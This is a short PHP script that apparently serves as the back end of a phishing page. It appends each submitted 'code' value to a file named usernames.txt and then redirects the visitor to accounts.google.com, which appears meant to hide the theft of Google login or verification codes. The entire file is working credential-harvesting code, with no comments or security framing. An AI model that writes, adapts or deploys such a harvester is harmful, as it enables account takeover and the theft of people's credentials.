<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['code'])) {
        file_put_contents("usernames.txt", "Code: " . $_POST['code'] . "\n", FILE_APPEND);
        header('Location: https://accounts.google.com');
        exit();
    } else {
        echo "Code not set!";
    }
} else {
    echo "Not a POST request!";
}
